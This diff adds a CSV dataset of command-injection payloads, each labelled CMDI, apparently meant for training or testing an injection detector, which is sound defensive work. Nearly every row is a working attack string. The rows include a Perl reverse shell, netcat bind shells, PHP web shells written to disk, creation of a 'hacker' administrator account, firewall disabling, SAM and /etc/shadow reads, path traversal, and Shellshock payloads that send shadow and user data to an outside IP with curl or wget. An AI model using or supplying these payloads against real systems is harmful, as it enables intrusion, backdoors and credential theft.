@@ -1,0 +1,1875 @@
+payload,attack
+ {${phpinfo()}},CMDI
+ {${phpinfo()}},CMDI
+ {${phpinfo()}},CMDI
+ {${phpinfo()}},CMDI
+ {${sleep(20)}},CMDI
+ {${sleep(20)}},CMDI
+ {${sleep(3)}},CMDI
+ {${sleep(3)}},CMDI
+ {${sleep(hexdec(dechex(20)))}} ,CMDI
+ {${sleep(hexdec(dechex(20)))}} ,CMDI
+ & whoami,CMDI
+ & whoami,CMDI
+ & whoami,CMDI
+ & whoami,CMDI
+ && whoami,CMDI
+ && whoami,CMDI
+ && whoami,CMDI
+ && whoami,CMDI
+ || whoami,CMDI
+ || whoami,CMDI
+ || whoami,CMDI
+ || whoami,CMDI
+" curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CMDI
+" curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CMDI
+" curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CMDI
+" curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CMDI
+ whoami,CMDI
+ whoami,CMDI
+ whoami,CMDI
+ whoami,CMDI
+; ,CMDI
+; curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+; curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+; curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+; curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+; dir,CMDI
+; dir,CMDI
+; dir,CMDI
+; dir,CMDI
+; dir C:\,CMDI
+; dir C:\,CMDI
+; dir C:\,CMDI
+; dir C:\,CMDI
+; dir C:\Documents and Settings\*,CMDI
+; dir C:\Documents and Settings\*,CMDI
+; dir C:\Documents and Settings\*,CMDI
+; dir C:\Documents and Settings\*,CMDI
+; dir C:\Users,CMDI
+; dir C:\Users,CMDI
+; dir C:\Users,CMDI
+; dir C:\Users,CMDI
+"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
+"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
+"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
+"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
+"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
+"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
+"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
+"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
+"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
+"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
+"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
+"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
+"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
+"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
+"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
+"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
+; id,CMDI
+; id,CMDI
+; id,CMDI
+; id,CMDI
+; ifconfig,CMDI
+; ifconfig,CMDI
+; ifconfig,CMDI
+; ifconfig,CMDI
+; ipconfig /all,CMDI
+; ipconfig /all,CMDI
+; ipconfig /all,CMDI
+; ipconfig /all,CMDI
+; ls -l /,CMDI
+; ls -l /,CMDI
+; ls -l /,CMDI
+; ls -l /,CMDI
+; ls -l /etc/,CMDI
+; ls -l /etc/,CMDI
+; ls -l /etc/,CMDI
+; ls -l /etc/,CMDI
+; ls -l /home/*,CMDI
+; ls -l /home/*,CMDI
+; ls -l /home/*,CMDI
+; ls -l /home/*,CMDI
+; ls -l /tmp,CMDI
+; ls -l /tmp,CMDI
+; ls -l /tmp,CMDI
+; ls -l /tmp,CMDI
+; ls -l /var/www/*,CMDI
+; ls -l /var/www/*,CMDI
+; ls -l /var/www/*,CMDI
+; ls -l /var/www/*,CMDI
+; ls -laR /etc,CMDI
+; ls -laR /etc,CMDI
+; ls -laR /etc,CMDI
+; ls -laR /etc,CMDI
+; ls -laR /var/www,CMDI
+; ls -laR /var/www,CMDI
+; ls -laR /var/www,CMDI
+; ls -laR /var/www,CMDI
+; nc -lvvp 4444 -e /bin/sh;,CMDI
+; nc -lvvp 4444 -e /bin/sh;,CMDI
+; nc -lvvp 4444 -e /bin/sh;,CMDI
+; nc -lvvp 4444 -e /bin/sh;,CMDI
+; net localgroup Administrators hacker /ADD,CMDI
+; net localgroup Administrators hacker /ADD,CMDI
+; net localgroup Administrators hacker /ADD,CMDI
+; net localgroup Administrators hacker /ADD,CMDI
+; net user hacker Password1 /ADD,CMDI
+; net user hacker Password1 /ADD,CMDI
+; net user hacker Password1 /ADD,CMDI
+; net user hacker Password1 /ADD,CMDI
+; net view,CMDI
+; net view,CMDI
+; net view,CMDI
+; net view,CMDI
+; netsh firewall set opmode disable,CMDI
+; netsh firewall set opmode disable,CMDI
+; netsh firewall set opmode disable,CMDI
+; netsh firewall set opmode disable,CMDI
+; netstat -an,CMDI
+; netstat -an,CMDI
+; netstat -an,CMDI
+; netstat -an,CMDI
+"; perl -e 'print ""X""x16096'",CMDI
+"; perl -e 'print ""X""x16096'",CMDI
+"; perl -e 'print ""X""x16096'",CMDI
+"; perl -e 'print ""X""x16096'",CMDI
+"; perl -e 'print ""X""x2048'",CMDI
+"; perl -e 'print ""X""x2048'",CMDI
+"; perl -e 'print ""X""x2048'",CMDI
+"; perl -e 'print ""X""x2048'",CMDI
+"; perl -e 'print ""X""x4096'",CMDI
+"; perl -e 'print ""X""x4096'",CMDI
+"; perl -e 'print ""X""x4096'",CMDI
+"; perl -e 'print ""X""x4096'",CMDI
+"; perl -e 'print ""X""x8096'",CMDI
+"; perl -e 'print ""X""x8096'",CMDI
+"; perl -e 'print ""X""x8096'",CMDI
+"; perl -e 'print ""X""x8096'",CMDI
+; pwd,CMDI
+; pwd,CMDI
+; pwd,CMDI
+; pwd,CMDI
+"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
+"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
+"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
+"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
+; sleep 1,CMDI
+; sleep 1,CMDI
+; sleep 1,CMDI
+; sleep 1,CMDI
+; sleep 10,CMDI
+; sleep 10,CMDI
+; sleep 10,CMDI
+; sleep 10,CMDI
+; sleep 15,CMDI
+; sleep 15,CMDI
+; sleep 15,CMDI
+; sleep 15,CMDI
+; sleep 5,CMDI
+; sleep 5,CMDI
+; sleep 5,CMDI
+; sleep 5,CMDI
+; sysinfo,CMDI
+; sysinfo,CMDI
+; sysinfo,CMDI
+; sysinfo,CMDI
+; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+; system('sleep 5');,CMDI
+; system('sleep 5');,CMDI
+; system('sleep 5');,CMDI
+; system('sleep 5');,CMDI
+; systeminfo,CMDI
+; systeminfo,CMDI
+; systeminfo,CMDI
+; systeminfo,CMDI
+; type %SYSTEMROOT%\repair\SAM,CMDI
+; type %SYSTEMROOT%\repair\SAM,CMDI
+; type %SYSTEMROOT%\repair\SAM,CMDI
+; type %SYSTEMROOT%\repair\SAM,CMDI
+; type %SYSTEMROOT%\repair\SYSTEM,CMDI
+; type %SYSTEMROOT%\repair\SYSTEM,CMDI
+; type %SYSTEMROOT%\repair\SYSTEM,CMDI
+; type %SYSTEMROOT%\repair\SYSTEM,CMDI
+; type C:\Windows\repair\SAM,CMDI
+; type C:\Windows\repair\SAM,CMDI
+; type C:\Windows\repair\SAM,CMDI
+; type C:\Windows\repair\SAM,CMDI
+; type C:\Windows\repair\SYSTEM,CMDI
+; type C:\Windows\repair\SYSTEM,CMDI
+; type C:\Windows\repair\SYSTEM,CMDI
+; type C:\Windows\repair\SYSTEM,CMDI
+; type C:\WINNT\repair\SAM,CMDI
+; type C:\WINNT\repair\SAM,CMDI
+; type C:\WINNT\repair\SAM,CMDI
+; type C:\WINNT\repair\SAM,CMDI
+; uname -a,CMDI
+; uname -a,CMDI
+; uname -a,CMDI
+; uname -a,CMDI
+; wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+; wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+; wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+; wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+; whoami,CMDI
+; whoami,CMDI
+; whoami,CMDI
+; whoami,CMDI
+; whoami,CMDI
+; whoami,CMDI
+; whoami,CMDI
+; whoami,CMDI
+";{$_GET[""cmd""]}",CMDI
+";{$_GET[""cmd""]}",CMDI
+";{$_GET[""cmd""]}",CMDI
+";{$_GET[""cmd""]}",CMDI
+;{cmd},CMDI
+;{cmd};,CMDI
+;{cmd}/n,CMDI
+;{cmd}|,CMDI
+;/usr/bin/id\n,CMDI
+;/usr/bin/id\n,CMDI
+;/usr/bin/id\n,CMDI
+;/usr/bin/id\n,CMDI
+;/usr/bin/id|,CMDI
+;/usr/bin/id|,CMDI
+;/usr/bin/id|,CMDI
+;/usr/bin/id|,CMDI
+;|/usr/bin/id|,CMDI
+;|/usr/bin/id|,CMDI
+;|/usr/bin/id|,CMDI
+;|/usr/bin/id|,CMDI
+;|/usr/bin/id|,CMDI
+;|/usr/bin/id|,CMDI
+;|/usr/bin/id|,CMDI
+;|/usr/bin/id|,CMDI
+;${@print(md5(RCEVulnerable))};,CMDI
+;${@print(md5(RCEVulnerable))};,CMDI
+;${@print(md5(RCEVulnerable))};,CMDI
+;${@print(md5(RCEVulnerable))};,CMDI
+;CMD=$'{cmd}';$CMD,CMDI
+";CMD=$""{cmd}"";$CMD",CMDI
+;CMD=$\'{cmd}\';$CMD,CMDI
+;echo '<script>alert(1)</script>',CMDI
+;echo '<script>alert(1)</script>',CMDI
+;echo '<script>alert(1)</script>',CMDI
+;echo '<script>alert(1)</script>',CMDI
+;echo%20'<script>alert(1)</script>',CMDI
+;echo%20'<script>alert(1)</script>',CMDI
+;echo%20'<script>alert(1)</script>',CMDI
+;echo%20'<script>alert(1)</script>',CMDI
+;echo%20KHMFRS$((69%2B67))$(echo%20KHMFRS)KHMFRS',CMDI
+;echo%20MPCSBG$((54%2B42))$(echo%20MPCSBG)MPCSBG,CMDI
+";echo%20YRBNTY$((83%2B14))$(echo%20YRBNTY)YRBNTY""",CMDI
+;id,CMDI
+;id,CMDI
+;id,CMDI
+;id,CMDI
+;id,CMDI
+;id,CMDI
+;id,CMDI
+;id,CMDI
+;id;,CMDI
+;id;,CMDI
+;id;,CMDI
+;id;,CMDI
+;id;,CMDI
+;id;,CMDI
+;id;,CMDI
+;id;,CMDI
+;id;,CMDI
+;id;,CMDI
+;id;,CMDI
+;id;',CMDI
+;id\n,CMDI
+;id\n,CMDI
+;id\n,CMDI
+;id\n,CMDI
+;id\n,CMDI
+;id\n,CMDI
+;id\n,CMDI
+;id\n,CMDI
+;id|,CMDI
+;id|,CMDI
+;id|,CMDI
+;id|,CMDI
+;id|,CMDI
+;id|,CMDI
+;id|,CMDI
+;id|,CMDI
+;ls+-al;',CMDI
+;netstat -a;,CMDI
+;netstat -a;,CMDI
+;netstat -a;,CMDI
+;netstat -a;,CMDI
+;netstat -a;,CMDI
+;netstat -a;,CMDI
+;netstat -a;,CMDI
+;netstat -a;,CMDI
+;phpinfo(),CMDI
+;phpinfo(),CMDI
+;phpinfo(),CMDI
+;phpinfo(),CMDI
+;phpinfo();//,CMDI
+;phpinfo();//,CMDI
+;phpinfo();//,CMDI
+;phpinfo();//,CMDI
+;phpinfo();//,CMDI
+;phpinfo();//,CMDI
+;phpinfo();//,CMDI
+;phpinfo();//,CMDI
+;system('{cmd}'),CMDI
+;system('/usr/bin/id'),CMDI
+;system('/usr/bin/id'),CMDI
+;system('/usr/bin/id'),CMDI
+;system('/usr/bin/id'),CMDI
+;system('cat%20/etc/passwd'),CMDI
+;system('cat%20/etc/passwd'),CMDI
+;system('cat%20/etc/passwd'),CMDI
+;system('cat%20/etc/passwd'),CMDI
+;system('cat%20/etc/passwd'),CMDI
+;system('cat%20/etc/passwd'),CMDI
+;system('cat%20/etc/passwd'),CMDI
+;system('cat%20/etc/passwd'),CMDI
+;system('id'),CMDI
+;system('id'),CMDI
+;system('id'),CMDI
+;system('id'),CMDI
+;uname;,CMDI
+;uname;,CMDI
+;uname;,CMDI
+;uname;,CMDI
+:phpversion();,CMDI
+:phpversion();,CMDI
+:phpversion();,CMDI
+:phpversion();,CMDI
+.........................../../../../file',CMDI
+...........................\\..\\..\\..\\file',CMDI
+../../../../../../../../../../../../boot.ini,CMDI
+../../../../../../../../../../../../boot.ini%00,CMDI
+../../../../../../../../../../../../etc/hosts,CMDI
+../../../../../../../../../../../../etc/hosts%00,CMDI
+../../../../../../../../../../../../etc/passwd,CMDI
+../../../../../../../../../../../../etc/passwd%00,CMDI
+../../../../../../../../../../../../etc/shadow,CMDI
+../../../../../../../../../../../../etc/shadow%00,CMDI
+../../../../../../../../../../../../localstart.asp,CMDI
+../../../../../../../../../../../../localstart.asp%00,CMDI
+../../../../../../../../conf/server.xml,CMDI
+../../../../../file//////////////',CMDI
+../../../../../filename/////[...]/////',CMDI
+../../../../etc/aaa/../aaa/bbb/../../hosts',CMDI
+../../../../etc/aaa/../hosts',CMDI
+../../../../etc/hosts/.',CMDI
+../../../file',CMDI
+../../../file%00',CMDI
+../../boot.ini,CMDI
+../../etc/././././hosts',CMDI
+..////////////..////////////////..///////////////../etc//////////hosts',CMDI
+../etc/./hosts',CMDI
+..\..\..\..\..\..\..\..\..\..\boot.ini,CMDI
+..\..\..\..\..\..\..\..\..\..\boot.ini%00,CMDI
+..\..\..\..\..\..\..\..\..\..\etc\passwd,CMDI
+..\..\..\..\..\..\..\..\..\..\etc\passwd%00,CMDI
+..\..\..\..\..\..\..\..\..\..\etc\shadow,CMDI
+..\..\..\..\..\..\..\..\..\..\etc\shadow%00,CMDI
+..%25c1%259c..%25c1%259cfile',CMDI
+..%2F..%2F..%2Fbin/ls%20-al|',CMDI
+..%2f..%2f..%2ffile',CMDI
+..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,CMDI
+..%c0%af..%c0%af../bin/ls%20-al|',CMDI
+..%c0%af..%c0%af..%c0%affile',CMDI
+.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd,CMDI
+.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow,CMDI
+"""",CMDI
+"""",CMDI
+""" & whoami",CMDI
+""" & whoami",CMDI
+""" & whoami",CMDI
+""" & whoami",CMDI
+""" && whoami",CMDI
+""" && whoami",CMDI
+""" && whoami",CMDI
+""" && whoami",CMDI
+""" | whoami",CMDI
+""" | whoami",CMDI
+""" | whoami",CMDI
+""" | whoami",CMDI
+""" || whoami",CMDI
+""" || whoami",CMDI
+""" || whoami",CMDI
+""" || whoami",CMDI
+""" whoami",CMDI
+""" whoami",CMDI
+""" whoami",CMDI
+""" whoami",CMDI
+"""; whoami",CMDI
+"""; whoami",CMDI
+"""; whoami",CMDI
+"""; whoami",CMDI
+""";id;""",CMDI
+"""'",CMDI
+"""'",CMDI
+"""'",CMDI
+"""\n/bin/ls -al\n""",CMDI
+"""& ping -i 30 127.0.0.1 &""",CMDI
+"""|/usr/bin/id|""",CMDI
+"""||/usr/bin/id|""",CMDI
+"""|id|""",CMDI
+() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; },CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",CMDI
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",CMDI
+"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",CMDI
+"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",CMDI
+"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",CMDI
+"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",CMDI
+"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",CMDI
+"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",CMDI
+"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",CMDI
+"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",CMDI
+"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",CMDI
+"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",CMDI
+"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",CMDI
+"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",CMDI
+"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",CMDI
+"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",CMDI
+"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",CMDI
+"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",CMDI
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",CMDI
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",CMDI
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",CMDI
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",CMDI
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",CMDI
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",CMDI
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",CMDI
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",CMDI
+"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",CMDI
+"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",CMDI
+"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",CMDI
+"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",CMDI
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",CMDI
+"() { :;}; /bin/bash -c \""wget http://a.b.c.d/bash-count.txt\""",CMDI
+() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,CMDI
+() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,CMDI
+() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,CMDI
+() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,CMDI
+() { :;}; echo vulnerable 10,CMDI
+() { :;}; echo vulnerable 10,CMDI
+() { :;}; echo vulnerable 10,CMDI
+() { :;}; echo vulnerable 10,CMDI
+() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,CMDI
+() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,CMDI
+() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,CMDI
+() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,CMDI
